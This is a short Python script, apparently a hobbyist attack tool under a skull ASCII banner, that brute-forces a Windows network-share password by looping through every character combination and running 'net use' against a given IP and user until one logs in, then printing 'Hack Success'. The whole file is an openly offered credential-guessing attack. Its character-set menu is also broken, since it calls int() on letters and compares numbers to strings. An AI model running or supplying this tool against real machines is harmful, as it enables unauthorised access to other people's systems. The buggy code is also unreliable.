import itertools
import time
import subprocess

ascii_skull = """
      ______
   .-        -.
  /            \\
 |,  .-.  .-.  ,|
 | )(_o/  \o_)( |
 |/     /\     \|
 (_     ^^     _)
  \__|IIIIII|__/
   | \IIIIII/ |
   \          /
    `--------`
"""

print(ascii_skull)

lengthA = int(input("What is the length of the password? : "))
Mode = input("What is mode for the characters (1,2,3) : ")
if int(Mode) == 1 :
    Characters = input("What is the characters used for the password? : ")
elif int(Mode) == 2 :
    print("a,A,1,aA,A1,a1,aA1")
    WCharacters = input("What is the characters used for the password? : ")
    if int(WCharacters) == "a" :
        Characters = "abcdefghijklmnopqrstuvwxyz"
    elif int(WCharacters) == "A" :
        Characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
    elif int(WCharacters) == 1 :
        Characters = "0123456789"
    elif int(WCharacters) == "aA" :
        Characters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
    elif int(WCharacters) == "A1" :
        Characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
    elif int(WCharacters) == "a1" :
        Characters = "abcdefghijklmnopqrstuvwxyz0123456789"
    elif int(WCharacters) == "aA1" :
        Characters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
    else :
        print("Wrong Answer")
        UU = input("Press for continue ... ")
        print(UU)
elif int(Mode) == 3:
    Characters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
else : 
    print("Wrong Mode")

ip = input("The ip of your computer : ")
user = input("What is your user : ")

def brute_force(chars, length):
    start_time = time.time()
    attempts = 0
    for attempt in itertools.product(chars, repeat=length):
        guess = ''.join(attempt)
        print(f"Trying: {guess}")
        attempts += 1
        result = subprocess.run(
            ["net", "use", f"\\\\{ip}", f"/user:{user}", guess],
            capture_output=True,
            text=True
        )
        if result.returncode == 0:
            print(f"Password found: {guess}")
            bb = input("Hack Success ... ")
            print(bb)
            break

def main():
    print("Starting brute-force...")
    start_time = time.time()
    brute_force(Characters, lengthA)
    

if __name__ == "__main__":
    main()
